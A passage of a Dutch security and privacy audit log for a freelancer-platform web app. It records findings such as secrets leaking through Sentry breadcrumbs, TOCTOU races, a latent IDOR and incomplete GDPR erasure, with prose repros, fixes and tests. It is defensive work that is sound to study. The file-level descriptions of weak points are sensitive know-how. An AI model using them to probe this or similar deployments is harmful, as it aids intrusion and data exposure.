mail, observability/report + Sentry). Delta t.o.v. de vorige ronde (basis `e656bcf2..bb591865`, o.a. `/api/metrics`,
dormant-clients, job-start-proximity, health-incident-open): opnieuw geverifieerd — de nieuwe `/api/metrics`-route is
fail-closed achter dezelfde Bearer `CRON_SECRET` (geen PII/secrets in de uitvoer), `dormant-clients` is strikt
freelancer-gescoopt (geen cross-partij-PII). `npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime schoon).

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant — beide authz-audits CONFIRMED
schoon), A02/A09 (secret-/PII-exfiltratie via logging/monitoring — de HOOG-bevinding hieronder), A03 (SQL/`$queryRaw`
alleen `SELECT 1`, XSS/`dangerouslySetInnerHTML` alleen het statische, nonce-gated theme-script, CSV-formule-injectie
gedekt door `escapeCsvField`), A05 (headers/CSP/nonce), A10 (SSRF: routing/mail-hosts zijn vast, nooit user-gestuurd),
upload-/storage-veiligheid (magic-bytes + allowlist + sandbox-CSP + presign-TTL), document-privacy (owner/admin +
anti-oracle 404 + audit op inzage én weigering), AVG art. 5(1)(c/d/e), 15, 17, 25, 32, 44.

### OPGELOST — [HOOG · A02/A09 secret-/PII-exfiltratie · AVG art. 32/44] Sentry-breadcrumbs werden nooit gescrubd

- **Geschonden regel:** CLAUDE.md ("geen secrets in git/log/code") + AVG art. 32 (passende beveiliging) / art. 44+
  (doorgifte aan een derde, mogelijk buiten-EER). **OWASP:** A09 (Security Logging & Monitoring Failures) / A02
  (Cryptographic/secret exposure). Severity HOOG: een echt secret (`GEOAPIFY_API_KEY`) én account-overname-/deel-tokens
  konden naar de externe verwerker (Sentry) lekken zodra `SENTRY_DSN` in productie gezet is.
- **Repro (CONFIRMED, latent tot `SENTRY_DSN` gezet is):** `@sentry/nextjs` (`^10.70.0`) **is** geïnstalleerd (de
  header-comment in `sentry-options.ts` beweerde ten onrechte "NIET geïnstalleerd"). `report.ts` initialiseert Sentry met
  `buildSentryInitOptions()` → default integrations, incl. de `httpIntegration` die STANDAARD per uitgaande http/fetch-call
  én per navigatie een breadcrumb aanlegt met de **volledige URL, query-string inbegrepen**. `scrubSentryEvent` (de
  `beforeSend`-scrubber) redigeerde `user`/`server_name`/`request.*`/`extra`/`contexts` maar **raakte `event.breadcrumbs`
  nooit aan**, en er was geen `beforeBreadcrumb`. De Geoapify-`apiKey` staat in de query-string van elke geocode/route-call
  (`routing.ts:191`); daarnaast dragen navigatie-breadcrumbs paden als `/wachtwoord-herstellen/<reset-token>` en
  `/vertrouwen/<id>/<deel-token>`. Bij élke in dezelfde request/proces gevangen fout gingen die breadcrumbs ongescrubd mee.
- **Fix (deze PR):** URL-/pad-scrubbing verhuisd naar een gedeelde pure module `src/lib/observability/url-scrub.ts`
  (`sanitizeUrl`/`stripUrlQueries`/`scrubSecretPathSegments`, één bron van waarheid met `client-error.ts`). `scrubSentryEvent`
  scrubt nu ook `event.breadcrumbs`: query-string + fragment weg en geheime pad-segmenten geredigeerd op elke URL in
  `message` en in de string-waarden van `data`, plus dezelfde recursieve PII/secret-redactie (`redact`) als `extra`/`contexts`.
  Rood→groen: nieuwe tests in `sentry-options.test.ts` (http-breadcrumb met `apiKey` → gestript, navigatie-breadcrumb met
  reset-token → `[redacted]`, PII-sleutel in `data` → geredacteerd, niet-array `breadcrumbs` → veilig) + `url-scrub.test.ts`;
  falen zonder de fix (`SECRET_KEY_123` bleef in de output). Stale header-comment gecorrigeerd.

### Geparkeerd — [MIDDEL · AVG art. 5(1)(c) minimalisatie / art. 13 juistheid privacyverklaring] `location`-vrijetekst gaat ongefilterd naar de routeprovider

- **Repro (CONFIRMED):** `location` is `optionalText(120)` (`src/lib/validation.ts:124,193,214`) — vrije tekst, geen
  stad-only-format. `geocodePlace` (`src/lib/services/routing.ts`) stuurt de rauwe waarde als `text` naar Geoapify wanneer
  `ROUTING_PROVIDER=geoapify` actief is (via `applications-create.ts` + opdracht-detailpagina). De privacyverklaring
  (`src/app/privacy/page.tsx:137-139`) belooft echter expliciet "we sturen een plaatsnaam (geen adres of naam)". Een
  gebruiker die een volledig straatadres intypt, laat dat adres alsnog de grens over gaan — in strijd met de belofte.
- **Aanbevolen fix:** óf `location` valideren/normaliseren naar stadsniveau (picker/autocomplete of adres-patroon weigeren)
  vóór geocoding, óf de privacyverklaring-tekst verzachten. **Vereist een product/juridische keuze (MENSENWERK.md §5)** —
  daarom geparkeerd, niet autonoom "gefixt" met een woordkeuze.

### OPGELOST (ronde 2026-08-25b) — [LAAG · AVG art. 5(1)(f) · defense-in-depth] client-error `message` wordt niet URL-query-gestript

- **Repro (PLAUSIBLE):** `parseClientError` (`src/lib/observability/client-error.ts`) haalt `stack`/`componentStack` wél
  door `stripUrlQueries`, maar `message` alleen door `truncate`. Bevat een browser-foutbericht toevallig een volledige URL
  met query-string (bv. een gefaalde fetch die de request-URL met een token echoot), dan bereikt die de logger (alleen
  e-mail-gemaskeerd) en Sentry (als exception-`value`, buiten de breadcrumb-scrub om) ongestript. De dominante
  token-lek-paden (pagina-URL + stacktraces) zijn al gedekt; dit is defense-in-depth.
- **Aanbevolen fix:** pas `stripUrlQueries` ook op `message` toe in `parseClientError` (nu triviaal — de helper is al
  geïmporteerd uit `url-scrub.ts`).

## Ronde 2026-08-24b (basis: `main` @ e656bcf2) — 2× TOCTOU OPGELOST (MIDDEL geld-integriteit ORT + LAAG AVG-retentie) + delta schoon

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(CSV-onboarding-import: injectie/mass-assignment/Zod-pariteit · support-retentie + cron-routes: AVG art. 5(1)(e)/
authz/PII-in-logs · ORT-geld-integriteit + franchiser-financials + nieuwe UI-kaarten: money-manipulatie/cross-tenant/
PII-overfetch). Delta t.o.v. de vorige ronde (basis `3f51108e`): commits `3f51108e..e656bcf2` — de defense-in-depth
`deleteDocumentById`-ownership-guard (#1213), de support-ticket-retentie AVG art. 5(1)(e) (#1214), de kosten-van-te-laat-
betalen op `/verplichtingen` (#1215), de CSV-import-Zod-pariteit + dispuut-freeze-next-action (#1216), de financiële
relatie op opdrachtgever-detail (bemiddelaar, #1217), de listing-kwaliteit-tips (#1218) en de ORT-toeslag-geld-integriteit

- wrong-party next-action (#1219). `npm audit --omit=dev`: **0 vulnerabilities** (prod-runtime schoon); `npm audit` (incl.
  dev): 6 dev-transitieve advisories, ongewijzigd t.o.v. de vorige ronde.

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant), A03 (SQL/`$queryRaw`, XSS/
`dangerouslySetInnerHTML`, CSV-/formule-injectie), A04 (insecure design: TOCTOU/race op check-then-act), A05 (headers/CSP),
A07 (auth/sessie/rate-limiting/cron-auth timing-safe), A10 (SSRF op server-side `fetch`), upload-/storage-veiligheid,
foutafhandeling, secrets/logs, én AVG art. 5(1)(c/d/e), 15, 17, 25, 32.

### OPGELOST — [MIDDEL · geld-integriteit / A04 TOCTOU] ORT-toeslag-guard was niet atomair met de rate-write

- **Geschonden regel:** CLAUDE.md regel 1 & 2 (server-side waarheid; geen client-beïnvloedbaar factuurbedrag).
  **OWASP:** A04 (Insecure Design — check-then-act TOCTOU-race). Severity MIDDEL: smal venster, maar heropent exact de
  geld-integriteitsbug die #1219 dicht wilde zetten, op productie-Postgres onder gelijktijdige belasting.
- **Repro (bevestigd, latent op Postgres; SQLite serialiseert writes):** `setOrtProfileAction`
  (`src/app/(protected)/samenwerkingen/[id]/actions.ts`) deed een losse `prisma.performance.count({ status: SUBMITTED })`
  en pas dáárna een aparte `collaboration.update` met de nieuwe ORT-toeslagen — twee niet-transactionele statements. Het
  factuurbedrag wordt bij goedkeuren live uit de collaboration-toeslagen afgeleid (niet gesnapshot bij indienen,
  bevestigd via `loadPerformance`). In het venster tussen de count (= 0) en de update kan de ZZP'er een urenstaat
  indienen (`submitPerformance`); daarna commit de update de toeslagen → het reeds-ingediende, nog niet goedgekeurde
  bedrag verschuift alsnog eenzijdig. Geen `$transaction`, row-lock of versiecheck sloot het gat.
- **Fix (deze PR):** guard + write gevouwen in één conditionele `updateMany` met de relationele conditie
  `performances: { none: { status: "SUBMITTED" } }` in de `where`. De database evalueert guard én schrijfactie in
  dezelfde statement (correlated NOT EXISTS): verschijnt er een SUBMITTED-urenstaat, dan matcht de WHERE niet meer en
  raakt de UPDATE 0 rijen → we blokkeren met dezelfde melding, i.p.v. het bedrag alsnog te wijzigen. Werkt op SQLite én
  Postgres, geen extra query. Rood→groen: `ort-guard.test.ts` herschreven — nieuwe atomiciteitstest assert dat de
  `none`-guard in de `updateMany.where` staat (faalt zonder de fix, bevestigd), plus geblokkeerd (count 0 → throw, geen
  audit) en toegestaan (count 1 → audit) voor CLIENT én ADMIN. Volledige gate groen.

### OPGELOST — [LAAG · AVG art. 5(1)(d) juistheid / gegevensverlies · TOCTOU] support-retentie-delete her-checkte de guard niet

- **Geschonden regel:** AVG art. 5(1)(d) (juistheid — geen verlies van nog-actieve data) + de scope-veiligheidsinvariant
  van de retentietaak (nooit een lopend ticket wissen). Severity LAAG: smal venster, lage kans.
- **Repro (latent):** `runSupportTicketRetentionTask` (`src/lib/support-retention-task.ts`) selecteerde per batch de
  stale-ticket-id's (`findMany` met de RESOLVED+resolvedAt-guard) en verwijderde die dáárna strikt op `id in [...]`
  zónder de guard te herhalen op de `deleteMany`. Heropent de helpdesk een ticket (RESOLVED → REOPENED) in het venster
  tussen `findMany` en `deleteMany`, dan wist de sweep alsnog een weer-actief ticket (+ z'n `SupportMessage`-cascade) —
  gegevensverlies op data die had moeten blijven. (Systemisch patroon; zie het geparkeerde LAAG-item hieronder.)
- **Fix (deze PR):** de `deleteMany` draagt nu het volledige guard-predicaat (`{ ...where, id: { in } }`), zodat een rij
  die op verwijdermoment niet meer RESOLVED-en-verlopen is, wordt overgeslagen (fail-closed). Rood→groen: nieuwe test
  simuleert een concurrent heropening in het TOCTOU-venster (findMany geeft de id terug, mutateert de status naar
  REOPENED, dan deleteMany) en assert `pruned === 0` + ticket overleeft — faalt zonder de `...where`-guard (bevestigd).
  Volledige gate groen.

### Geparkeerd — [LAAG · A04 TOCTOU] zelfde select-then-delete-patroon in de zuster-retentietaken

- **Severity:** LAAG (systemisch, lage kans, pre-existing). **Bestanden:** `src/lib/message-retention-task.ts`,
  `lead-retention-task.ts`, `application-retention-task.ts`, `notification-retention-task.ts`,
  `health-incident-retention-task.ts`, `webhook-event-retention-task.ts`, `routing-cache-retention-task.ts` (verifieer
  elk). **Repro/risico:** dezelfde `findMany`-ids → `deleteMany({ where: { id: { in } } })` zonder de guard te herhalen;
  bij de meeste is de bron immutabel na retentie (webhook-ledger, routing-cache), maar message/application/notification
  kunnen theoretisch nog muteren. **Aanbevolen fix:** spiegel de support-retentie-fix — voeg het volledige where-predicaat
  toe aan elke `deleteMany` (`{ ...where, id: { in } }`) + een TOCTOU-regressietest per taak.

### Geparkeerd — [LAAG · onderhoudbaarheid] CSV-import lengte-constanten zijn handmatig gespiegeld i.p.v. geïmporteerd

- **Severity:** LAAG (niet exploiteerbaar; drift-risico). **Bestand:** `src/lib/onboarding/import.ts` (`NAME_MAX`=120,
  `COMPANY_NAME_MAX`=160, `HEADLINE_MAX`/`LOCATION_MAX`=120). **Risico:** deze maxima zijn met de hand gelijkgehouden aan
  de Zod-schema's in `src/lib/validation.ts` (`registerSchema`/`freelancerProfileSchema`/`companyProfileSchema`); wijzigt
  iemand een max in `validation.ts` zonder de constante hier bij te werken, dan drift de import-schrijfpad stil uit
  Zod-pariteit. Nu getest op waarde-pariteit maar via gedupliceerde getallen. **Aanbevolen fix:** importeer de maxima
  rechtstreeks uit de Zod-schema's (of assert gelijkheid in een test die faalt bij drift) i.p.v. de getallen te dupliceren.

### Schone oppervlakken (0 nieuwe bereikbare gaten — 3 parallelle adversariële audits + eigen tracing)

- **CSV-onboarding-import (A01/A03/A04):** `/admin/import` triple-gated (middleware → `requireRole("ADMIN")` op page +
  beide actions + template-route; `requireRole` leest rol/status live uit DB, geen JWT-vertrouwen). Volledige
  `auth → rol → Zod → actie → audit`-keten op `commitImport` (per-rij `USER_IMPORTED` + samenvattend `USERS_IMPORTED`,
  transactioneel). Geen mass-assignment: `role` via vaste alias-map (geen ADMIN-alias) + herbevestigd met `assertImportRole`
  (Zod-enum) vóór de write; `status`/`mustChangePassword`/`passwordHash` server-afgeleid; geen `tenantId` (ADMIN-globaal).
  `website` dubbel gevalideerd via `httpUrl()` (blokkeert `javascript:`/`data:` → geen stored XSS). CSV-parser is een
  hand-rolled RFC4180-parser (geen ReDoS), export via `escapeCsvField` (formule-injectie-guard), `MAX_CSV_BYTES`=2MB +
  `MAX_ROWS`=500 vóór parsen. E-mail-fouten via maskerende logger (geen PII/secret in logs).
- **Support-retentie + cron-routes (AVG art. 5(1)(e) / A07):** `prunableSupportTicketWhere` = RESOLVED + `resolvedAt`
  (not null, < cutoff); strikte `<`, geen off-by-one; cascade wist `SupportMessage`-body's mee; geen PII-kopie elders
  (geen notificatie/audit met ticket-subject/body). `/api/tasks/run-all` + `/api/metrics` fail-closed CRON-gated (geen
  secret → 503, fout token → 401 via `timingSafeEqual`, Bearer-header niet query-param); metrics-gauge is een kaal
  geaggregeerd getal, geen PII. Verwerkingsregister-entry (grondslag GERECHTVAARDIGD_BELANG, 12 mnd) matcht de code 1:1.
- **Franchiser-financials + nieuwe UI-kaarten (cross-tenant / AVG art. 5(1)(c)):** `franchise/opdrachtgevers/[id]` haalt
  `company` met `tenantScopeWhere(actor)` + `notFound()`; alle financiële queries draaien pas ná die tenant-verificatie op
  `company.id`. `VerplichtingenPanel` rol-gated (CLIENT) + data via `counterpartyUserId: actor.id` (eigen data). Betaalgedrag
  onder `PAYMENT_MIN_SAMPLE_SIZE` toont geen individuele factuur/bedrag (alleen aggregaat). Geen `dangerouslySetInnerHTML`;
  alle DB-strings via React-auto-escape. `payment-obligation-charges.ts`/`job-listing-quality.ts` zijn puur/DB-vrij.

## Ronde 2026-08-24 (basis: `main` @ 3f51108e) — 1× LAAG OPGELOST (defense-in-depth IDOR, document-delete) + delta schoon

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(AVG-erasure-volledigheid · IDOR/object-authz + functie-authz · cross-tenant/franchiser-isolatie +
injectie/SSRF/upload/export/PII-overfetch/secrets-logs). Delta t.o.v. de vorige ronde (basis `57790fa6`):
commits `57790fa6..3f51108e` — de annuleerreden-erasurefix (#1208, zélf de vorige ronde), de rate-limit-store
aflever-heartbeat/dead-man's-switch + `zzp_ratelimit_delivery_*`-gauges op `/api/metrics` (#1209), de snelle-
antwoorden in de berichten-composer (alle rollen, #1210), het wachttijd-signaal per urenstaat op `/diensten`
(ZZP'er, #1211) en de maanddoel-tempo/kalender-pacing op `/prognose` (ZZP'er, #1212). `npm audit --omit=dev`:
**0 vulnerabilities** (prod-runtime schoon); `npm audit` (incl. dev): dev-transitieve advisories ongewijzigd
t.o.v. de vorige ronde (zie het LAAG-item onderaan de 08-23-ronde).

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant), A03 (SQL/`$queryRaw`,
XSS/`dangerouslySetInnerHTML`, CSV-/formule-injectie), A05 (headers/CSP-nonce), A07 (auth/sessie/rate-limiting),
A10 (SSRF op server-side `fetch`), upload-/storage-veiligheid + path-traversal, foutafhandeling, secrets/logs,
én AVG art. 5/15/17/25/32 (dataminimalisatie, inzage/erasure-symmetrie, k-anonimiteit, logs-lekken-geen-PII,
derden-doorgifte). De 3 adversariële audits traceerden élk hun oppervlak zelf (niet louter de backlog-claim):
franchiser-`where`-clausules, alle `[id]`/`[...key]`-document/PDF/dossier-routes, en élk vrije-tekst-PII-veld in
`schema.prisma` tegen `anonymizeUser`/`account-export.ts`.

### OPGELOST — [LAAG · defense-in-depth IDOR / A01] `deleteDocumentById` deed geen eigen ownership-check

- **Geschonden regel:** CLAUDE.md regel 2 (auth → rol → **ownership** → Zod → actie → audit op elke mutatie).
  **OWASP:** A01 (Broken Object Level Authorization / IDOR). Severity LAAG omdat het nu niet exploiteerbaar is
  (beide call-sites geven een documentId door dat uit een eigen credential via `loadOwnedCredential` komt),
  maar een toekomstige call-site met een form-/client-gestuurde id zou zonder deze guard andermans (gevoelig)
  document kunnen verwijderen — precies de latente IDOR die deze harden dicht zet.
- **Repro (latent):** `deleteDocumentById(actorId, documentId)` (`src/app/(protected)/certificaten/actions.ts`)
  laadde het document op `id` alleen (`findUnique({ where: { id } })`, select `storageKey`) en deed daarna een
  onvoorwaardelijke `document.delete({ where: { id } })` — géén filter op `ownerId`. Een aanroeper die een
  vreemde documentId zou doorgeven, wist dat vreemde document (+ blob) zonder eigenaarscheck.
- **Fix (deze PR):** de functie selecteert nu ook `ownerId` en faalt fail-closed bij een mismatch: is
  `doc.ownerId !== actorId`, dan verwijdert ze niets, schrijft ze een `DOCUMENT_DELETE_DENIED`-auditregel (het
  bestaande denied-audit-idioom, spiegelt `DOCUMENT_ACCESS_DENIED`) en keert terug. De bestaande, legitieme
  resubmit-opruiming (eigen document) blijft werken. Rood→groen: nieuw testbestand
  `certificaten/delete-owner-guard.test.ts` (2 tests: eigen document → verwijderd + `DOCUMENT_DELETED`;
  vreemd document → NIET verwijderd + `DOCUMENT_DELETE_DENIED`) — de tweede test faalt zonder de guard
  (bevestigd: guard uitgezet → vreemd document alsnog verwijderd). De TOCTOU-mock in `persist-toctou.test.ts`
  levert nu ook `ownerId` (weerspiegelt dat het opgeruimde document van de actor is). Volledige gate groen.

### Schone oppervlakken (0 nieuwe bereikbare gaten — 3 parallelle adversariële audits + eigen tracing)

- **Delta-code (#1209–#1212):** `/api/metrics` is CRON_SECRET-gated (fail-closed: geen secret → 503, fout token
  → 401), `force-dynamic`, `no-store`, en de uitvoer bevat uitsluitend geaggregeerde numerieke gauges — geen
  PII, geen secrets; de nieuwe `RateLimitDeliveryHeartbeat`-tabel houdt alleen timestamps/teller/driver-modus
  (expliciet geen PII). De snelle antwoorden (`quick-replies.ts`) zijn volledig statische, gecureerde zinnen die
  door dezelfde `sendMessage`-actie (auth → participant-check → validatie) lopen als elk handmatig bericht — geen
  nieuw mutatiepad, geen injectie (React auto-escape, geen `dangerouslySetInnerHTML`). Het wachttijd-signaal
  (`performance-wait.ts`) en de maanddoel-tempo (`income-goal.ts`) zijn pure, deterministische afleidingen uit
  al-geladen, op de eigen actor gescoopte data — geen nieuwe Prisma-query, geen PII-overfetch naar de client.
- **IDOR / object-authz (A01):** alle 42 route-handlers + de mutatie-subset van de 53 action-files: overal
  `auth → rol → ownership/tenant → Zod → actie → audit`, met 404-maskering (CWE-203/208-veilig) en denied-access-
  audit op de document/PDF/dossier-routes. Geen blinde `update({ where: { id } })` op client-`id`; geen
  mass-assignment (`ownerId`/`role`/`tenantId`/`status` altijd server-afgeleid uit `actor`).
- **Cross-tenant / franchiser-isolatie:** elke franchiser-query gescoopt via `tenantScopeWhere`/`ownsViaTenant`/
  post-fetch `tenantId`-guard (tenant uit live-DB `currentActor`), fail-closed; exports (fees/companies/roster)
  rol-gated + tenant-gescoopt + ge-audit.
- **AVG-erasure-volledigheid (art. 17):** `anonymizeUser` redacteert voor élk vrije-tekst-veld met een cross-
  party/audit/domain-event-kopie álle kopieën (bron-rij → auditmetadata → domain-event-payload → tegenpartij-
  notificatie via de gedeelde body-builders). `account-export.ts` is tegenpartij-minimaal (derde-partij-relaties
  alleen als opaque id, vrije tekst alleen eigen-geschreven rijen). Geen nieuw sch, geen nieuwe PII-kopie.
- **Injectie/SSRF/upload/export (A03/A10):** geen `$queryRawUnsafe`/rauwe SQL; enige `dangerouslySetInnerHTML` is
  het statische thema-script (CSP-nonce); CSV via `escapeCsvField`; alle server-side `fetch`-hosts vast/env-
  gebaseerd (Geoapify/DUO/BIG/iDIN/HIBP/Mollie/Stripe) — geen user-gestuurde host; uploads via de storage-
  abstractie met type-/grootte-/magic-byte-validatie + path-traversal-guard; rauwe Prisma-fouten bereiken de
  client nooit (`safe-action-error.ts`).

## Ronde 2026-08-23b (basis: `main` @ 57790fa6) — 1× HOOG OPGELOST (onvolledige AVG-erasure, annuleerreden) + delta schoon

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(AVG-erasure-symmetrie · IDOR/object-authz + cross-tenant · injectie/SSRF/upload/export). Delta t.o.v. de
vorige ronde (basis `c2c7cd60`): commits `c2c7cd60..57790fa6` — de bemiddelaar-operations-agenda (.ics, #1206),
de verificatie-adapter aflever-heartbeat (dead-man's-switch DUO/BIG/iDIN, #1202), de tarief-diagnose op het
opdracht-detail (#1205), het onbenutte-beschikbaarheid-signaal (#1203), de gedekt-verlopen-certificaat-taakfix
(#1207) en de #1201-erasurefix zelf. `npm audit` (incl. dev): 6 advisories — **uitsluitend dev-transitief**
(brace-expansion, deepmerge-ts/prisma-CLI, js-yaml, esbuild-Windows), niet in de productie-runtime (`--omit=dev`
= 0); ongewijzigd t.o.v. de vorige ronde (zie LAAG-item hieronder).

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant), A03 (SQL/`$queryRaw`,
XSS/`dangerouslySetInnerHTML`, CSV-/formule-injectie, iCal/RFC 5545-injectie), A05 (headers), A07 (auth/sessie),
A10 (SSRF op server-side `fetch`), upload-/storage-veiligheid + path-traversal, foutafhandeling, én AVG art. 5/15/
17/25/32 (dataminimalisatie, inzage/erasure-symmetrie, k-anonimiteit, logs-lekken-geen-PII, derden-doorgifte).

### OPGELOST — [HOOG] Door de ANNULEERDER getypte annuleerreden overleefde díens eigen AVG-erasure (2 van de 3 kopieën)

- **Geschonden regel:** AVG art. 17 (recht op verwijdering) + de multi-kopie-erasure-invariant van de codebase
  (CLAUDE.md regel 5). **OWASP:** A01 (privacy-datablootstelling). Zelfde bugklasse als #1201 (afkeurreden).
- **Repro (bevestigd):**
  1. Een partij (opdrachtgever óf ZZP'er) annuleert een samenwerking (`changeCollaborationStatus`) met een
     verplichte vrije-tekstreden. Die reden landt in DRIE kopieën: (1) `Collaboration.cancellationReason`,
     (2) de `COLLABORATION_STATUS_CHANGED`-auditmetadata (`{ from, to, reason, chargeable }`), (3) verbatim in de
     body van de `COLLABORATION_STATUS`-notificatie op de feed van de TEGENPARTIJ (een ándere gebruiker).
  2. De annuleerder verzoekt om verwijdering → admin draait `anonymizeUser`. Die wiste tot nu toe alléén kopie 1
     (`collaboration.updateMany({ cancelledById })`). Kopie 2 (auditmetadata) en kopie 3 (tegenpartij-notificatie)
     werden nergens geraakt: de generieke `scrubAuditMetadataPii` matcht geen vrije tekst, en de brede eigen-feed-
     wipe (`notification.updateMany({ where: { userId } })`) raakt alleen de EIGEN feed van de betrokkene. De reden
     bleef dus leesbaar op de tegenpartij-feed, in diens AVG-inzage-export (`account-export.ts` geeft
     `Notification.body` prijs) én in het auditlogboek. Mogelijk art. 9-gevoelig (bv. een ziekte-reden).
- **Fix (deze PR):** `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) leest nu vóór de transactie
  de eigen geannuleerde samenwerkingen (`cancelledById == betrokkene`, reden ≠ null) mét beide partij-userId's, en
  redacteert in de transactie alle drie de kopieën: `cancellationReason` → null, de `reason`-sleutel in de
  `COLLABORATION_STATUS_CHANGED`-auditmetadata → `[verwijderd]` (parse-en-patch; `from`/`to`/`chargeable` blijven als
  verantwoordingsspoor), en de exact gereconstrueerde notificatie-body op de tegenpartij-feed (partij ≠ annuleerder).
  De body-string staat nu in de gedeelde bron `src/lib/cascade/notification-bodies.ts`
  (`collaborationCancelledNotificationBody`), gebruikt door zowel de schrijver (`samenwerkingen/actions.ts`) als de
  erasure — drift-vrij (spiegelt de #1201-afkeurreden-behandeling). Rood→groen: 2 nieuwe erasure-tests
  (auditmetadata + tegenpartij-notificatie) + 2 locked-body-tests; volledige gate groen.

### Schone oppervlakken (0 bereikbare gaten — 3 parallelle adversariële audits + eigen tracing)

- **Delta-code (#1202–#1207):** de nieuwe `.ics`-bemiddelaar-agenda-route is `requireActor` → rol (FRANCHISER) →
  tenant-gescoopte queries (`job.tenantId`/`freelancerProfile.tenantId`) → rate-limit → RFC 5545-ge-escapete
  serialisatie (`escapeIcsText` dekt backslash/`;`/`,`/CRLF) → audit; geen cross-tenant-lek, geen iCal-injectie
  (UID's zijn interne DB-id's). De verificatie-heartbeat-decorators slaan geen PII op (alleen kanaal + driver-naam;
  fail-open, wijzigen het `verify()`-resultaat nooit). De tarief-diagnose op het opdracht-detail is owner-gated en
  respecteert de k-anonimiteitsdrempel (`MARKET_RATE_MIN_SAMPLE = 10` via `computeMarketBand`). De
  signals/pending-tasks/availability-gaps-wijzigingen zijn puur/deterministisch en op de eigen actor gescoopt.
- **IDOR / object-authz (A01):** alle dynamische route-handlers met een client-`id` (documenten, factuur-/prestatie-/
  dossier-/DBA-/modelovereenkomst-PDF, media, franchise-exports, agenda) + de mutatie-subset van de action-files:
  overal `auth → rol → ownership → Zod → actie → audit`, 404-maskering (CWE-203/208-veilig), denied-access-audit.
- **Cross-tenant / franchiser-isolatie:** elke franchiser-query gescoopt via `tenantScopeWhere`/`ownsViaTenant`
  (tenant uit live-DB `currentActor`), fail-closed, tenant-suspend trekt toegang live in.
- **Injectie/SSRF/upload/export (A03/A10):** geen `$queryRawUnsafe`/rauwe SQL; enige `dangerouslySetInnerHTML` is
  een statisch themascript (CSP-nonce); CSV-exports lopen allemaal via `escapeCsvField` (neutraliseert `= + - @`
  \t \r); alle server-side `fetch`-hosts zijn vast/env-gebaseerd (DUO/BIG/iDIN, Geoapify, HIBP, Mollie/Stripe) —
  geen user-gestuurde URL/host; uploads via de storage-abstractie met type-/grootte-/magic-byte-validatie,
  server-gegenereerde storage-keys en path-traversal-guard; rauwe Prisma-fouten bereiken de client nooit
  (`safe-action-error.ts`).

### Geparkeerd (LAAG) — dev-transitieve npm-advisories

- `npm audit` (incl. dev) meldt 6 advisories (deepmerge-ts/prisma-CLI, brace-expansion, js-yaml, esbuild-Windows) —
  allemaal **dev-only DoS/ReDoS**, niet in de productie-runtime (`--omit=dev` = 0). Ongewijzigd t.o.v. de vorige
  ronde; volgen bij de volgende prisma-bump (`npm audit fix --force` zou de prisma-CLI-major kunnen breken).

## Ronde 2026-08-23 (basis: `main` @ c2c7cd60) — 2× HOOG OPGELOST (onvolledige AVG-erasure) + 1× LAAG gedocumenteerd

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken
(IDOR/object-authz · cross-tenant/franchiser-isolatie · privacy/AVG). Delta t.o.v. de vorige ronde (basis
`6e5ffd01`): commits `6e5ffd01..c2c7cd60` — de betaal-webhook-handtekening-heartbeat (#1197), verwachte-
betaaldatum op het factuurdetail (#1198), platform-betaaltermijn-benchmark op de betaalreputatie (#1199) en de
doorlooptijd-nudge bij bijna-verlopen certificaat (#1200). `npm audit --omit=dev`: **0 vulnerabilities** (prod
schoon); `npm audit` (incl. dev): 6 (5 HOOG/1 LAAG) — **uitsluitend dev-transitief** (prisma-CLI→deepmerge-ts,
brace-expansion, js-yaml, esbuild-Windows), niet bereikbaar in de productie-runtime — zie LAAG-item onderaan.

**Dekking (OWASP Top 10 / ASVS + AVG):** A01 (object-/functie-authz + IDOR + multi-tenant), A03 (SQL/`$queryRaw`,
XSS/`dangerouslySetInnerHTML`, CSV-/formule-injectie), A05 (CSP-nonce/HSTS/frame-deny/nosniff/Permissions-Policy),
A07 (auth/sessie/rate-limiting fail-closed), A08 (mass-assignment), A10 (SSRF op server-side `fetch`), upload-/
storage-veiligheid + path-traversal, foutafhandeling (geen Prisma-fout/stacktrace naar client), én AVG art. 5/15/
17/20/25/32 (dataminimalisatie, inzage/erasure-symmetrie, k-anonimiteit, retentie, logs-lekken-geen-PII, derden).

### OPGELOST — [KRITIEK-blok HOOG] Door de OPDRACHTGEVER getypte AFKEUR-reden overleefde díens eigen AVG-erasure (2 velden, 3 kopieën elk)

- **Geschonden regel:** AVG art. 17 (recht op verwijdering) + de eigen multi-kopie-erasure-invariant van de
  codebase (CLAUDE.md regel 5, audit/PII). **OWASP:** A01 (privacy-datablootstelling van eigen PII).
- **Repro (bevestigd, bereikbaar via de bestaande `anonymizeUser`-admin-actie):**
  1. Opdrachtgever keurt een factuur af (`rejectInvoice`) of een prestatie (`rejectPerformance`) met een
     vrije-tekstreden. Die reden landt in DRIE kopieën: (1) `Invoice.rejectionReason` /
     `Performance.rejectionReason`, (2) de `INVOICE_REJECTED` / `PERFORMANCE_REJECTED`-auditmetadata (`{ reason }`),
     (3) verbatim in de body van de notificatie op de feed van de ZZP'er (een ándere gebruiker).
  2. De opdrachtgever verzoekt om verwijdering → admin draait `anonymizeUser`. De erasure redacteerde WÉL de
     symmetrische ZZP'er-kant (`INVOICE_CREDITED`-creditreden) maar had voor de afkeur-reden geen op de
     opdrachtgever (`counterpartyUserId` / `collaboration.company.userId`) gescoopte redactie — de reden bleef
     leesbaar op de ZZP'er-feed, in diens AVG-inzage-export (`account-export.ts` geeft `Notification.body` prijs)
     én in het auditlogboek. De code parkeerde dit ("bewust niet hier — zie backlog") maar dekte alleen de
     ZZP'er-erasure-hoek, niet de opdrachtgever-als-auteur-hoek.
- **Fix (deze PR):** `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) leest nu vóór de
  transactie de eigen afgekeurde facturen (`counterpartyUserId == betrokkene`, REJECTED) én prestaties
  (`collaboration.company.userId == betrokkene`, REJECTED) en redacteert in de transactie alle drie de kopieën:
